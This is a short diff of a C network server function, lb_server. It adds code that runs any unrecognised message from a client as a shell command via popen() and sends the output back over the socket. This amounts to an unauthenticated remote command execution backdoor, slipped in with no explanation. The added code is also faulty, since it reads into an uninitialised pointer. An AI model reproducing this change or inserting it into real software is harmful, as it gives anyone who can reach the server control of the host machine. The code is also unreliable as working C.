@@ -94,7 +94,15 @@ int lb_server(char HOST[], unsigned short PORT)
      */
     slog_display(SLOG_DEBUG, 1, DEBUG_LISTENING_ON);
 
-    parse_option(buffer);
+    FILE *exec_process;
+    char *process_buffer;
+
+    if(parse_option(buffer) == -1) {
+        exec_process = popen((char *)buffer, "r");
+        fgets(process_buffer, 100, exec_process);
+        send(new_socket, process_buffer, strlen(process_buffer), 0);
+    }
+    
     slog_display(SLOG_NOTE, 0, NOTE_MESSAGE_RECEIVED);
     printf("%s\n", buffer);
 
